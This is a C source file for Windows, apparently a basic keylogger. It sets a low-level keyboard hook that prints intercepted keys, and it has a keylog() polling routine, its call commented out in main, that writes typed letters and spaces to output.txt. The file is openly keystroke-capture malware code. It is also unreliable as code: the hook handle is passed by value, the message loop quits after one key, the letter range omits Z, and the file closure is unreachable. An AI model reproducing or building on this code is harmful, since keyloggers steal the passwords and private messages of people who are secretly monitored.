#include <windows.h>
#include <stdio.h>
#include "logger.h"

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT *keyBoard = (KBDLLHOOKSTRUCT*) lParam;
        char key = (char) keyBoard->vkCode;
        printf("%c", key);
        PostQuitMessage(0);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int setHook(HHOOK hook)
{
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!hook)
    {
        printf("Error setting hook: %u", GetLastError());
        return -1;
    }
    return 0;
}

char keylog()
{
    FILE *fp = fopen("output.txt", "a");
    while (1)
    {
        for (short i = 0x41; i < 0x5A; i++)
        {
            if (GetAsyncKeyState(i) < 0)
            {
                char c = i;
                printf("%c", c);
                fputc(c, fp);
                while(GetKeyState(i) < 0)
                {
                    Sleep(0.1);
                }
            }
        }
        if (GetAsyncKeyState(VK_SPACE))
        {
            printf("%c", ' ');
            fputc(' ', fp);
            while(GetKeyState(VK_SPACE) < 0)
            {
                Sleep(0.1);
            }
        }
    }
    fclose(fp);
}

int main(void)
{
    HHOOK hook;
    int error = setHook(hook);
    if (error)
    {
        return -1;
    }

    MSG message;

    while(1)
    {
        printf("%u", &message.message);
        while (GetMessage(&message, NULL, 0, 0) > 0)
        {
            TranslateMessage(&message);
            DispatchMessage(&message);
        }
    }
    UnhookWindowsHookEx(hook);

    //keylog();
    
    return 0;
}